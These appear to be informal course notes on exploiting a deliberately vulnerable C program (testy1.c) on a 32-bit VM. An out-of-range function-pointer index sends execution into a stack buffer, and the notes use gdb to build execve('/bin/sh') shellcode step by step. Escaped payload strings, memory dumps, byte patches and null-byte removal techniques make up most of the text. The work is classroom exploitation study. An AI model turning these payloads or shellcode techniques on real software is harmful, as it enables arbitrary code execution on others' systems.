Don't forget to mention that the addresses will differ based upon the process start method.
All of my examples are running in a screen.  YM_W_V if you run otherwise.
Also, gdb will change up pointer based upon environment variable.  See later
notes on this.

testy1.c notes

This is code I had for a class.  The class used this program
as an example of a buffer overflow.  The final part of the assignment was to 
invoke the write_secret function. This is similar to what we did earlier,
However, this code does not use a strcpy but instead uses a funciton pointer
and read.  This is a good starting point for the next step since
it can be more easily exploited to get a shell since it uses read instead
of strcpy we can use assembly instructions which contains null bytes.  Null
bytes will truncate string.  Furthermore the function call using a function
pointer means it is preset to call a function.


gdbit.sh and runbin.sh are used with testy1.c.  Edit the .gdbinit file to change
options for use with this program as well.


For simplicty I'm going to present an answer and then work backwards to show 
how it works.

Use screen and ssh to get two terminals on the vm.

In one terminal issue this command to start the program.
[davis@vm-i386 progs]$ ./runbin.sh 
You should see a selection prompt with two choices, Receive wisdom and
Add wisdom. Enter 2 to add some wisdom.  Type some text. "This is a test."
When the menu reappears, enter 1 and it should echo back "This is a test."

What's happening here is that when you enter a number, its an index into
an array of function pointers.  The input is read with the read system call
and it reads up to the full size of the buffer (minus 1 for a null) which is 1024 bytes.
Afterwards, the program adds a nul byte to end of what's read in the buffer
and then converts the ascii text to an int.  He uses the int to index into 
an array of function pointers.

Since the read buffer is large and on the stack, we are going to provide
an initial number for the index in the function pointer.  We are going
to index beyond the array of the function pointer array back into the
buffer used for reading.  Then we will place code to get a shell inside
this buffer.  

So before we get to in depth, lets see the result get a shell and then we
can disect it line for line.


In another terminal issue this command to run gdb (Make sure you edit .gdbinit first)

[davis@vm-i386 progs]$ ./gdbit.sh 


This will start gdb in tui mode and connect to the process running the demo program.

The reason we are running scripts instead of raw commands is:
  o  We are going to pass a buffer with escape commands to generate bytecodes. 
  o  The gdbit script is simply for convienence.

So back to gdb. in gdb there should be a break set at line 107.  Since we are
connecting to a running program it might attach during a point where we are
not in our test code.  Simply type cont at the prompt to resume execution since
gdb stops execution when it connects.

(gdb) cont

Switch back to the test code and use your mouse to paste the following text.  This is
why its advantageous to run with ssh and not use the qemu console.

771509060\x00\x00\x00AAAA\x2f\x62\x69\x6e\x2f\x73\x68\x00\x40\xf3\xff\xbf\x00\x00\x00\x00\xbb\x40\xf3\xff\xbf\xb9\x48\xf3\xff\xbf\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80AAAAAAAAAA\x50\xf3\xff\xbf

hit the enter key

Switch back to gdb.  It shold be at a breakpoint using src debugging. ie. not asm.

Step using next to determine the value of s.

print the value of s
(gdb) print /x s
$1 = 0x2dfc4b44

print it again in decimal
(gdb) print  s
$2 = 771509060

Notice that is the first bytes of our buffer.  Notice these bytes are not escape codes.

Dump the buffer using strings.  This will show ascii text in the buffer.  We can use
this view to get addresses.

(gdb) print buf
$4 =   "771509060\000\000\000AAAA/bin/sh\000@\363\377\277\000\000\000\000\273@\363\377\277\271H\
363\377\277\272\000\000\000\000\270\v\000\000\000̀AAAAAAAAAAP\363\377\277\n", '\000' <repeats 954
 times>
(gdb) 

dump it again showing addresses

(gdb) x/24s buf
0xbffff330:     "771509060"
0xbffff33a:     ""
0xbffff33b:     ""
0xbffff33c:     "AAAA/bin/sh"
0xbffff348:     "@\363\377\277"
0xbffff34d:     ""
0xbffff34e:     ""
0xbffff34f:     ""
0xbffff350:     "\273@\363\377\277\271H\363\377\277\272"
0xbffff35c:     ""
0xbffff35d:     ""
0xbffff35e:     ""
0xbffff35f:     "\270\v"
0xbffff362:     ""
0xbffff363:     ""
0xbffff364:     "̀AAAAAAAAAAP\363\377\277\n"
0xbffff376:     ""
0xbffff377:     ""
0xbffff378:     ""
0xbffff379:     ""
0xbffff37a:     ""
0xbffff37b:     ""
0xbffff37c:     ""
0xbffff37d:     ""

So we dump way more than necessary with the 24 specifier.  You can see this because the AAAAAA
markers show up and the second one is near the end of the buffer at address 0xbffff364.

Dump it again using hex codes.

(gdb) x/20xw buf
0xbffff330:     0x35313737      0x36303930      0x00000030      0x41414141
0xbffff340:     0x6e69622f      0x0068732f      0xbffff340      0x00000000
0xbffff350:     0xfff340bb      0xf348b9bf      0x00babfff      0xb8000000
0xbffff360:     0x0000000b      0x414180cd      0x41414141      0x41414141
0xbffff370:     0xbffff350      0x0000000a      0x00000000      0x00000000


Dump the function pointer array
(gdb) x/4xw ptrs
0x80ec660 <ptrs>:       0x00000000      0x080488ee      0x0804898e      0x00000d00

From the code, we know 
int fptr  ptrs[3] = { NULL, get_wisdom, put_wisdom };

So we can assume the addresses in the ptrs dump correspond to the two functions listed 
in the code.

(gdb) disas get_wisdom, +10
Dump of assembler code from 0x80488ee to 0x80488f8:
   0x080488ee <get_wisdom+0>:   push   %ebp
   0x080488ef <get_wisdom+1>:   mov    %esp,%ebp
   0x080488f1 <get_wisdom+3>:   sub    $0x18,%esp
   0x080488f4 <get_wisdom+6>:   movl   $0x77206f6e,-0x17(%ebp)
End of assembler dump.

and

(gdb) disas put_wisdom, +10
Dump of assembler code from 0x804898e to 0x8048998:
   0x0804898e <put_wisdom+0>:   push   %ebp
   0x0804898f <put_wisdom+1>:   mov    %esp,%ebp
   0x08048991 <put_wisdom+3>:   push   %edi
   0x08048992 <put_wisdom+4>:   sub    $0x94,%esp
End of assembler dump.

We can also do this like so:

(gdb) disas ptrs[1], +10
Dump of assembler code from 0x80488ee to 0x80488f8:
   0x080488ee <get_wisdom+0>:   push   %ebp
   0x080488ef <get_wisdom+1>:   mov    %esp,%ebp
   0x080488f1 <get_wisdom+3>:   sub    $0x18,%esp
   0x080488f4 <get_wisdom+6>:   movl   $0x77206f6e,-0x17(%ebp)
End of assembler dump.

Which makes sense.  Our index for s is not 1 or 2 though.  Its 771509060.
So what is that address?

(gdb) disas ptrs[771509060], +22
Dump of assembler code from 0xbffff350 to 0xbffff366:
   0xbffff350:  mov    $0xbffff340,%ebx
   0xbffff355:  mov    $0xbffff348,%ecx
   0xbffff35a:  mov    $0x0,%edx
   0xbffff35f:  mov    $0xb,%eax
   0xbffff364:  int    $0x80
End of assembler dump.

So that is our code to perform a sytemcall for doing execev to execute a shell.
So where is this memory?

(gdb) print /x $esp
$7 = 0xbffff330

So our top of stack is above this.  This means this is making sense.  The memory
for the buf was pushed on the stack the shell code is higher in memory
but nearby.  lets dump the stack and see how it lines up with what we have
seen so far.

So, I'm going to use a trick here to print the memory in a single column. Print memory
the first time with a specified address with only one repeat and then print memory the 
next time without a specified address.  The result is

(gdb) x/x $esp
0xbffff330:     0x35313737
(gdb) x/x     
0xbffff334:     0x36303930
0xbffff338:     0x00000030
0xbffff33c:     0x41414141
0xbffff340:     0x6e69622f
0xbffff344:     0x0068732f
0xbffff348:     0xbffff340
0xbffff34c:     0x00000000
0xbffff350:     0xfff340bb
0xbffff354:     0xf348b9bf
0xbffff358:     0x00babfff
0xbffff35c:     0xb8000000
0xbffff360:     0x0000000b
0xbffff364:     0x414180cd
0xbffff368:     0x41414141
0xbffff36c:     0x41414141
0xbffff370:     0xbffff350

So with the data from above I will annotate whats on the stack.


0xbffff330:     0x35313737	<- top of stack.  Also the first byte of buf[]
0xbffff334:     0x36303930	<- Our ptrs index 's' starts above and continues here ...
0xbffff338:     0x00000030  <- and here where it ends with null terminating byte.
0xbffff33c:     0x41414141	<- Our first marker in buf[]
0xbffff340:     0x6e69622f  <- Our string for "/bin/sh" 0x2f is ascii for /
0xbffff344:     0x0068732f	<- The last part of "/bin/sh" including null terminating byte.
0xbffff348:     0xbffff340
0xbffff34c:     0x00000000
0xbffff350:     0xfff340bb 	<- where the ptr[s] points to. In other words, our new function.
0xbffff354:     0xf348b9bf
0xbffff358:     0x00babfff
0xbffff35c:     0xb8000000
0xbffff360:     0x0000000b
0xbffff364:     0x414180cd 	<- our int80 is the last two bytes here. Ending our system call.
0xbffff368:     0x41414141	<- Our second marker starts in word above in buf[] but is also here.
0xbffff36c:     0x41414141	<- and here. Remember we can access memory in byte offsets.
0xbffff370:     0xbffff350 	<- our hacked function pointer address ie. ptrs[s]

FWIW, here is the ascii for "/bin/sh" in hex.
(gdb) print /x "/bin/sh"
$8 =   {[0x0] = 0x2f,
  [0x1] = 0x62,
  [0x2] = 0x69,
  [0x3] = 0x6e,
  [0x4] = 0x2f,
  [0x5] = 0x73,
  [0x6] = 0x68,
  [0x7] = 0x0}

FWIW, here is the ascii for our ptrs index. 
(gdb) print /x "771509060"
$9 =   {[0x0] = 0x37,
  [0x1] = 0x37,
  [0x2] = 0x31,
  [0x3] = 0x35,
  [0x4] = 0x30,
  [0x5] = 0x39,
  [0x6] = 0x30,
  [0x7] = 0x36,
  [0x8] = 0x30,
  [0x9] = 0x0}

To fill in the rest, I'm going to go  back to the code and continue below.  I'm also
going to show how to do a system call. I'm going to show the commands to read the docs
but cut out only the relevant portions.



[davis@yoshi stage2]$ cat /usr/include/asm/unistd_32.h | grep exec
#define __NR_execve 11

This shows that exec is decimal 11.  

[davis@yoshi stage2]$ man syscall
<parts omitted>

      arch/ABI   instruction          syscall #   retval Notes
       ───────────────────────────────────────────────────────────────────
       i386       int $0x80            eax         eax

       arch/ABI      arg1  arg2  arg3  arg4  arg5  arg6  arg7  Notes
       ──────────────────────────────────────────────────────────────────
       i386          ebx   ecx   edx   esi   edi   ebp   -

[davis@yoshi stage2]$ man 3 execve
ASIDE: $ apropos exec 
<parts omitted>

           #include <unistd.h>

           int ret;
           char *cmd[] = { "ls", "-l", (char *)0 };
           char *env[] = { "HOME=/usr/home", "LOGNAME=home", (char *)0 };
           ...
           ret = execve ("/bin/ls", cmd, env);



(gdb) disas ptrs[771509060], +22
Dump of assembler code from 0xbffff350 to 0xbffff366:
   0xbffff350:  mov    $0xbffff340,%ebx
   0xbffff355:  mov    $0xbffff348,%ecx
   0xbffff35a:  mov    $0x0,%edx
   0xbffff35f:  mov    $0xb,%eax
   0xbffff364:  int    $0x80
End of assembler dump.
and
(gdb) disas /r ptrs[771509060], +22
Dump of assembler code from 0xbffff350 to 0xbffff366:
   0xbffff350:  bb 40 f3 ff bf  mov    $0xbffff340,%ebx  ; ptr to "/bin/sh"
   0xbffff355:  b9 48 f3 ff bf  mov    $0xbffff348,%ecx  ; ptr to cmd, with closing null pointer
   0xbffff35a:  ba 00 00 00 00  mov    $0x0,%edx		; null ptr for env
   0xbffff35f:  b8 0b 00 00 00  mov    $0xb,%eax
   0xbffff364:  cd 80   int    $0x80
End of assembler dump.


0xbffff330:     0x35313737	<- top of stack.  Also the first byte of buf[]
0xbffff334:     0x36303930	<- Our ptrs index 's' starts above and continues here ...
0xbffff338:     0x00000030  <- and here where it ends with null terminating byte.
0xbffff33c:     0x41414141	<- Our first marker in buf[]
0xbffff340:     0x6e69622f  <- Our string for "/bin/sh" 0x2f is ascii for /
0xbffff344:     0x0068732f	<- The last part of "/bin/sh" including null terminating byte.
0xbffff348:     0xbffff340		<- our storage for cmd pointer
0xbffff34c:     0x00000000		<- our null pointer cmd struct
0xbffff350:     0xfff340bb 	<- where the ptr[s] points to. In other words, our new function.
..				..				<- our "/bin/sh" ptr move as arg1 to ebx.
0xbffff354:     0xf348b9bf  	<- at 55 offset is start of move of arg2 man page cmd arg.
0xbffff358:     0x00babfff		<- at 5a offset is start of move of arg3 man page env arg which is null.
0xbffff35c:     0xb8000000		<- at 5f offset is start of move of syscall number 11/0xb to eax
0xbffff360:     0x0000000b		<- the actual 11/0xb
0xbffff364:     0x414180cd 	<- our int80 is the last two bytes here. Ending our system call.
0xbffff368:     0x41414141	<- Our second marker starts in word above in buf[] but is also here.
0xbffff36c:     0x41414141	<- and here. Remember we can access memory in byte offsets.
0xbffff370:     0xbffff350 	<- our hacked function pointer address ie. ptrs[s]


Ok, so now lets look at the classic document from Aleph One paper
http://insecure.org/stf/smashstack.html 

About midway through the document there is a section on using different instructions so that
we don't have nulls in our buffer which is the problem I mentioned earlier.

So instead of a mov 0x0, we do an xor eax, eax to get a zero in eax.  then we mov
this value to our destination.

Rerun the code using existing buffer and stop at the point prior to executing the hacked 
function pointer.  Sadly, gdb does not have an assemble command like dos debug, but
we can get by patching the code once we know the opcodes.

So open text file testy1.asm. It looks like this:

xor eax, eax
mov edx, eax

Up to now, we have been using gdb which uses AT&T notation where its "operation src, dst"
but nasm uses intel notation where its "operation dst, src".  Yes, we can change
notation in gdb. Sadly I am used to gdb default.

FWIW, you can use nasm on your host machine or vm.  Nasm can build for 32-bit or 64-bit with
the -f mode switch.

$ nasm -felf testy1a.asm

That will assemble the code for 32-bit. And to see the byte codes, do 

$ objdump -D testy1a.o
Disassembly of section .text:

00000000 <.text>:
   0:   31 c0                   xor    %eax,%eax
   2:   89 c2                   mov    %eax,%edx

And now we are back to AT&T syntax.  Yes, I know we can switch format.  I'm used 
to the default.

Go back to gdb and do this:

(gdb) disas /r ptrs[s], +22
set your bearings.

(gdb) set var *((char *) 0xbffff35a) = 0x31
(gdb) set var *((char *) 0xbffff35b) = 0xc0
(gdb) set var *((char *) 0xbffff35c) = 0x89
(gdb) set var *((char *) 0xbffff35d) = 0xd0
(gdb) set var *((char *) 0xbffff35e) = 0x90
(gdb) disas /r ptrs[s], +22
Dump of assembler code from 0xbffff350 to 0xbffff366:
   0xbffff350:  bb 40 f3 ff bf  mov    $0xbffff340,%ebx
   0xbffff355:  b9 48 f3 ff bf  mov    $0xbffff348,%ecx
   0xbffff35a:  31 c0   xor    %eax,%eax  
   0xbffff35c:  89 c2   mov    %eax,%edx 
   0xbffff35e:  90      nop
   0xbffff35f:  b8 0b 00 00 00  mov    $0xb,%eax
   0xbffff364:  cd 80   int    $0x80
End of assembler dump.

(I just realized I did the nop from memory.  I shed a slight tear, not an indian looking at trash 
tear, but kind of a 4chan meme tear as I realized I'm about to watch the superbowl alone 
but I know this kind of useless triva by heart. LOL)

So same thing as before for the mov 0xb
Take that back. Gonna do 
(gdb) set var *((char *) 0xbffff35e) = 0x83
(gdb) set var *((char *) 0xbffff35f) = 0xc0
(gdb) set var *((char *) 0xbffff360) = 0xb
(gdb) set var *((char *) 0xbffff361) = 0xcd
(gdb) set var *((char *) 0xbffff362) = 0x80

(gdb) disas /r ptrs[s], +22
Dump of assembler code from 0xbffff350 to 0xbffff366:
   0xbffff350:  bb 40 f3 ff bf  mov    $0xbffff340,%ebx
   0xbffff355:  b9 48 f3 ff bf  mov    $0xbffff348,%ecx
   0xbffff35a:  31 c0   xor    %eax,%eax  
   0xbffff35c:  89 c2   mov    %eax,%edx 
   0xbffff35e:  83 c0 0b        add    $0xb,%eax
   0xbffff361:  cd 80   int    $0x80
   0xbffff363:  00 cd   add    %cl,%ch
   0xbffff365:  80 41 41 41     addb   $0x41,0x41(%ecx)
End of assembler dump.

Added some more nops and I have
Dump of assembler code from 0xbffff350 to 0xbffff366:
   0xbffff350:  bb 40 f3 ff bf  mov    $0xbffff340,%ebx
   0xbffff355:  b9 48 f3 ff bf  mov    $0xbffff348,%ecx
   0xbffff35a:  31 c0   xor    %eax,%eax  
   0xbffff35c:  89 c2   mov    %eax,%edx 
   0xbffff35e:  83 c0 0b        add    $0xb,%eax
   0xbffff361:  cd 80   int    $0x80
   0xbffff363:  90      nop
   0xbffff364:  90      nop
   0xbffff365:  80 41 41 41     addb   $0x41,0x41(%ecx)
End of assembler dump.

not that it matters

but quick check of the memory

(gdb) x/x $esp
0xbffff330:     0x35313737
0xbffff334:     0x36303930
0xbffff338:     0x00000030
0xbffff33c:     0x41414141
0xbffff340:     0x6e69622f
0xbffff344:     0x0068732f
0xbffff348:     0xbffff340
0xbffff34c:     0x00000000
0xbffff350:     0xfff340bb
0xbffff354:     0xf348b9bf
0xbffff358:     0xc031bfff
0xbffff35c:     0xc083c289
0xbffff360:     0x9080cd0b
0xbffff364:     0x41418090
0xbffff368:     0x41414141
0xbffff36c:     0x41414141
0xbffff370:     0xbffff350

Ok. I still see some 0x0's but lets see if it runs when I hit continue
Yeap,...
Continuing.
process 484 is executing new program: /usr/bin/bash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
warning: Could not load shared library symbols for linux-gate.so.1.
Do you need "set solib-search-path" or "set sysroot"?

Going to stop now and watch game. bbl


Resuming here.


Also this is the summary mods we made at runtime.  Rather than do it again manually we can 
save this to a cmd file for gdb.

[davis@yoshi progs]$ cat patch.gdb 
set var *((char *) 0xbffff35a) = 0x31
set var *((char *) 0xbffff35b) = 0xc0
set var *((char *) 0xbffff35c) = 0x89
set var *((char *) 0xbffff35d) = 0xc2
set var *((char *) 0xbffff35e) = 0x83
set var *((char *) 0xbffff35f) = 0xc0
set var *((char *) 0xbffff360) = 0xb
set var *((char *) 0xbffff361) = 0xcd
set var *((char *) 0xbffff362) = 0x80

Restart our setup, next until tmp() call.
I can't do a disas of tmp or ptrs[s] since our code in the stack is not in the
elf sections.  They can be added.  See aleph one doc on how to fix this.  Instead
just do this:

(gdb) print ptrs[s]
$3 = (fptr) 0xbffff350
(gdb) disas 0xbffff350, +22
Dump of assembler code from 0xbffff350 to 0xbffff366:
   0xbffff350:  mov    $0xbffff340,%ebx
   0xbffff355:  mov    $0xbffff348,%ecx
   0xbffff35a:  mov    $0x0,%edx
   0xbffff35f:  mov    $0xb,%eax
   0xbffff364:  int    $0x80
End of assembler dump.
(gdb) 

patch the code with the stuff we did earlier.
(gdb) source patch.gdb
(gdb) disas 0xbffff350, +22
Dump of assembler code from 0xbffff350 to 0xbffff366:
   0xbffff350:  mov    $0xbffff340,%ebx
   0xbffff355:  mov    $0xbffff348,%ecx
   0xbffff35a:  xor    %eax,%eax
   0xbffff35c:  mov    %edx,%eax  <-------- error. edx is dest
   0xbffff35e:  add    $0xb,%eax
   0xbffff361:  int    $0x80
   0xbffff363:  add    %cl,%ch
   0xbffff365:  addb   $0x41,0x41(%ecx)
End of assembler dump.

Now we are back to where we left off.

So the next problem is that our code has some remaining zeros in our buffer.

(gdb) source patch.gdb
(gdb) x/20xw buf
0xbffff330:     0x35313737      0x36303930      0x00000030      0x41414141
0xbffff340:     0x6e69622f      0x0068732f      0xbffff340      0x00000000
0xbffff350:     0xfff340bb      0xf348b9bf      0xc031bfff      0xc083d089
0xbffff360:     0x0080cd0b      0x414180cd      0x41414141      0x41414141
0xbffff370:     0xbffff350      0x0000000a      0x00000000      0x00000000

Namely, we have 0x00000030 word and the 0x00000000 word.  We also have two bytes
which are zero.  Let's address the words first.

The first zero is  the null term for the ptr index.  We can't get rid of that once
since its the mechanism we are depending upon to build a shell.  Don't dispair.  We
are only using this code to show how to build shell code for the strcpy overflow.

The second zero is the null pointer for our execve call.  That can be fixed by
relocating the strings to be at the end of the buffer.  So let's do that part next.

So in summary this is what we have:

(gdb) x/1xw buf
0xbffff330:     0x35313737	<- Function pointer index to >-----------\
0xbffff334:     0x36303930								 	          |
0xbffff338:     0x00000030	<- null required for prog src.	          |
0xbffff33c:     0x41414141									          |
0xbffff340: /-> 0x6e69622f <--------------------------------------\   |
0xbffff344: |   0x0068732f									       |  |
0xbffff348: \-< 0xbffff340 <---------------------------------------+  |
0xbffff34c:     0x00000000 <- Null pointer for exec                |  |
0xbffff350:     0xfff340bb <- Start of our code. Use buffs here >-/   |
0xbffff354:     0xf348b9bf									          |
0xbffff358:     0xc031bfff									          |
0xbffff35c:     0xc083d089									          |
0xbffff360:     0x0080cd0b									          |
0xbffff364:     0x414180cd									          |
0xbffff368:     0x41414141									          |
0xbffff36c:     0x41414141									          |
0xbffff370:     0xbffff350 <- Funciton pointer to our code <---------/


So the desired goal is move those buffer to end. markers are put in the
unused spots left behind.


0xbffff330:     0x35313737	<- Function pointer index to >-----------\
0xbffff334:     0x36303930								 	          |
0xbffff338:     0x00000030	<- null required for prog src.	          |
0xbffff33c:     0x41414141  <- markers                                |
0xbffff340:     0x42424242                                            |
0xbffff344:     0x43434343									          |
0xbffff348:     0x44444444                                            |
0xbffff34c:     0x45454545                                            |
0xbffff350:     0xfff340bb <- Start of our code. Use buffs here >--\  |
0xbffff354:     0xf348b9bf									       |  |
0xbffff358:     0xc031bfff									       |  |
0xbffff35c:     0xc083d089									       |  |
0xbffff360:     0x0080cd0b									       |  |
0xbffff364:     0x414180cd									       |  |
0xbffff368:     0x41414141									       |  |
0xbffff36c:     0x41414141									       |  |
0xbffff370:     0xbffff350 <- Funciton pointer to our code <-------|-/
0xbffff374:     0x6e69622f <---------------------------------------+  
0xbffff378:     0x0068732f									       |  
0xbffff37c:     0xbffff340 <---------------------------------------/  
0xbffff380:     0x00000000 <- Null pointer for exec                   

So, now our patch file has additional lines in it.  So, now the patch file looks like this

<show patch.gdb step 2>

So our initial zeros are gone

But our address are wrong

So patch those

<sthow patch.gdb step 3>



Results in 
(gdb) source patch.gdb
(gdb) disas 0xbffff350, +22
Dump of assembler code from 0xbffff350 to 0xbffff366:
   0xbffff350:  mov    $0xbffff374,%ebx
   0xbffff355:  mov    $0xbffff37c,%ecx
   0xbffff35a:  xor    %eax,%eax
   0xbffff35c:  mov    %eax,%edx
   0xbffff35e:  add    $0xb,%eax
   0xbffff361:  int    $0x80
   0xbffff363:  add    %cl,%ch
   0xbffff365:  addb   $0x41,0x41(%ecx)
End of assembler dump.
(gdb) 

(gdb) x/1xw 0xbffff374
0xbffff374:     0x6e69622f
0xbffff378:     0x0068732f
0xbffff37c:     0xbffff374
0xbffff380:     0x00000000

So, I don't know how to recreate the buffer with escape codes other than this weird method.
Here goes. Do a p or p/s s is default.  It will print readable ascii and then for non
printable ascii it will print in octal. Print the buffer, copy it to a text editor
and then add a new line everywhere you see a \.  Then replace the octal sequence with a hex.
So, \273 is replaced with \xBB.

You can either look up the octal or use p\x as well.  ie. p\s buf copy and paste, manually seperate
p\x buf and replace in editor.  Its helpful to use vim with column mode edits.

Some recognizable octal to decimal is 
0377 is ff 
0277 is bf
0177 is 7f

Even then its error prone, so you will need to double check with x/1w address

The end result is:
----------------------
771509060\x00\x00\x00AAAABBBBCCCCDDDDEEEE\xbb\x74\xf3\xff\xbf\xb9\x7c\xf3\xff\xbf\x31\xc0\x89\xc2\x83\xc0\x0b\xcd\x80\x0b\xcd\x80AAAAAAAABB\x50\xf3\xff\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x74\xf3\xff\xbf\x00\x00\x00\x00

(gdb) x/22xw buf
0xbffff330:     0x35313737      0x36303930      0x00000030      0x41414141
0xbffff340:     0x42424242      0x43434343      0x44444444      0x45454545
0xbffff350:     0xfff374bb      0xf37cb9ff      0xc031ffff      0xc083c289
0xbffff360:     0x0b80cd0b      0x414180cd      0x41414141      0x42424141
0xbffff370:     0xbffff350      0x6e69622f      0x0068732f      0xbffff374
0xbffff380:     0x00000000      0x0000000a


(gdb) disas 0xbffff350, +22
Dump of assembler code from 0xbffff350 to 0xbffff366:
   0xbffff350:  mov    $0xbffff374,%ebx
   0xbffff355:  mov    $0xbffff37c,%ecx
   0xbffff35a:  xor    %eax,%eax
   0xbffff35c:  mov    %eax,%edx
   0xbffff35e:  add    $0xb,%eax
   0xbffff361:  int    $0x80
   0xbffff363:  or     %ebp,%ecx
   0xbffff365:  addb   $0x41,0x41(%ecx)
End of assembler dump.


Now, we still have a problem.  The nulls in the buffer are moved to the end, but if
we are doing a string read only the first byte of the null pointer would be read
and put on the stack.  We need a full 4 bytes of zero to make a null pointer, so
we need one more tweak.


so using the last string and our patch4.gdb it still executes a shell.  Here is the new buffer.



771509060\x00\x00\x00AAAA\xb8\x80\xf3\xff\xbf\x31\xdb\x89\x18\x90\x90\x90\x90\x90\x90\x90\xbb\x74\xf3\xff\xbf\xb9\x7c\xf3\xff\xbf\x31\xc0\x89\xc2\x83\xc0\x0b\xcd\x80\x0b\xcd\x80AAAAAAAABB\x40\xf3\xff\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x74\xf3\xff\xbf\x00

It still works, but we have a null byte for the terminating string of /bin/sh.

<using patch5.gdb and testya2.asm - second part>
<using stepi and layout next to see assembly. print regs and dumping memory>


When using nasm it does not use mov.b or movb to change data width.  It uses the register
name to determine the data width. In this case use bl to use just a byte of the ebx register.

ASIDE: 
ebx 32 bits - Full 32 bits of the ebx register.
bx  16 bits - lower 16-bits of ebx register.  Don't think you can specify upper.
bl  8 bits - bl is lower byte, bh is upper byte

Once again here is the new buffer.  (I've lost the markers BBBB, etc.  They are replaced with 0x90.
Copy the line, split at these locations, replace bytes manually.


771509060\x00\x00\x00AAAA\xb8\x80\xf3\xff\xbf\x31\xdb\x89\x18\x83\xe8\x05\x88\x18\x90\x90\xbb\x74\xf3\xff\xbf\xb9\x7c\xf3\xff\xbf\x31\xc0\x89\xc2\x83\xc0\x0b\xcd\x80\x0b\xcd\x80AAAAAAAABB\x40\xf3\xff\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x33\x74\xf3\xff\xbf\x00


So, now we have a payload which does not have any nulls, but it uses absolute addresses.


Prior to executing tmp()

(gdb) x/22xw buf
0xbffff330:     0x35313737      0x36303930      0x00000030      0x41414141
0xbffff340:     0xfff380b8      0x89db31bf      0x05e88318      0x90901888
0xbffff350:     0xfff374bb      0xf37cb9bf      0xc031bfff      0xc083c289
0xbffff360:     0x0b80cd0b      0x414180cd      0x41414141      0x42424141
0xbffff370:     0xbffff340      0x6e69622f      0x3368732f      0xbffff374
0xbffff380:     0x00000a00      0x00000000


(gdb) disas 0xbffff340, +34
Dump of assembler code from 0xbffff340 to 0xbffff362:
   0xbffff340:  mov    $0xbffff380,%eax  <- We want to replace abs address with relative address
   0xbffff345:  xor    %ebx,%ebx
   0xbffff347:  mov    %ebx,(%eax)
   0xbffff349:  sub    $0x5,%eax
   0xbffff34c:  mov    %bl,(%eax)
   0xbffff34e:  nop
   0xbffff34f:  nop
   0xbffff350:  mov    $0xbffff374,%ebx <- and this
   0xbffff355:  mov    $0xbffff37c,%ecx <- and this
   0xbffff35a:  xor    %eax,%eax
   0xbffff35c:  mov    %eax,%edx
   0xbffff35e:  add    $0xb,%eax
   0xbffff361:  int    $0x80
End of assembler dump.
(gdb) 


Step 6

Modify the code so it does not use absolute addresses.

So looking at the code there are three absolute addresses which we need to replace with 
relative addresses.  The first is for writing a null pointer for our exec env call, the next
two are for writing the addresses of the exec cmd string specifier.  The aleph one doc has a 
neat trick for doing this.  He shows how you setup a jmp call combination.

Here is a picture of the stack.

towards top of stack
Lower addresses
Buffer ->					bufs index, s
							start of shell code
							...
							...
							...
							end of shell code, the int $0x80
							function pointer to our code.
							The "/bin/sh" string including spot for null term string.
							The env structure - parm one points to above




Higher addresses
towards bottom of stack


For reference here is the man 2 execve page.
       int execve(const char *filename, char *const argv[], char *const envp[]);

and the man 3 page.

[davis@yoshi stage2]$ man 3 execve
ASIDE: $ apropos exec 
<parts omitted>

           #include <unistd.h>

           int ret;
           char *cmd[] = { "ls", "-l", (char *)0 };
           char *env[] = { "HOME=/usr/home", "LOGNAME=home", (char *)0 };
           ...
           ret = execve ("/bin/ls", cmd, env);


Looking at both, it becomes apparant why the command is placed first and then the pointer to
the command is listed.  The first argv element is the command itself.  So if a program is run, say
foo, like so:

$ foo thing1 thing2

Then the argv elements are

argv[0] = /fqp/foo
argv[1] = thing1
argv[2] = thing2
argv[3] = null

So, our assembly translates like this in C.

execve(cmd[0],cmd,NULL);

We only need to know one address which can both be relative if we use aleph one's trick and the others
can be figured out at runtime.

towards top of stack
Lower addresses
                  Buffer ->  bufs index, s
							 function pointer to our code.
                             jump relative to call instruction.   ------------------------\
                      /-->   start of shell code                                          |
                      |      ...                                                          |
                  (2) |      ...                                                          | (1)
                      |      ...                                                          |
                      |      end of shell code, the int $0x80                             |
                      \----  call relative instruction to start of shell code  <----------/
                             The "/bin/sh" string including spot for null term string.
                             The env structure - parm one points to above




Higher addresses
towards bottom of stack

His method works by placing the string right after the call.  When the call is performed,
we know the return address is placed on the stack.  And in this case the return address
will be the location of our cmd and cmd args for "/bin/sh".



Since we are going to reuse this code where we don't have the artificial buf[2] construct,
we might as well move the function pointer to the top so we can move all the code to one 
contigous location.


Start off with finding the starting point used by the model of the existing code in the c program.
Run the code as is, just enter AAAA.  We will hit breakpoint in gdb and step to point before we
assign s.

You should see something like this:
(gdb) x/4xw buf
0xbffff330:     0x41414141      0x41414141      0x0000000a      0x00000000
(gdb) x/4w ptrs
0x80ec660 <ptrs>:       0x00000000      0x080488ee      0x0804898e      0x00000d00


If the value for buf is different its because you are not in the first terminal running in a screen
session.  We are going to use this static setup to build relocatable code.   If its not that address
you can do the fixup using this technique for calculating the address for this model.


conceptionally for this model memory looks like this:

low memory addresses
--------------------
text
main() is in this section


---------------------
data
ptrs is in global memory as intialized data at 0x80ec660 ---\  (mention how this address varies)
                                                            |
  --------                                                  |
     |                                                      |
     v  heap grows down                                     |
                                                            |  We want S to point to code
                                                            |  in here.
---------------------                                       |
     ^ grows up                                             |
     |                                                      |
stack                                                       /
buf is on stack at 0xbffff330                            <--


---------------------
high memory addresses


From before:
(now step until we assign s with next command)
(gdb) set var s = 771509060
(gdb) x/4xw ptrs
0x80ec660 <ptrs>:       0x00000000      0x080488ee      0x0804898e      0x00000d00
(gdb) print /x 0x80ec660+(s*4)
$30 = 0xbffff370
(gdb)

370 is a nice even offset, but we are going to move our code around a bit so that the stuff required
by the model are at the top of memory and then the relocatable shell code and finally with the
strings at the end.

How to determine the start address of the function pointer ptrs[s].
Remember s is a pointer to a function, so it moves in increments of 4 bytes corresponding to
addresses in IA32.

Lets move it up to next word boundary following the index s.  S is 9 characters long or 9 bytes.  Ten
if you count the null.  Pad 6 to get a word boundary so we can add a marker.  

So, 
0xbffff330 start of buf our s in ascii starts here.
0xbffff340 is where we will store the function pointer

So, we need s to be 340 instead of 370.

(gdb) print /x 0x80ec660+((s-0x30/4)*4)
$38 = 0xbffff340
(gdb) print s-(0x30/4)
$39 = 771509048
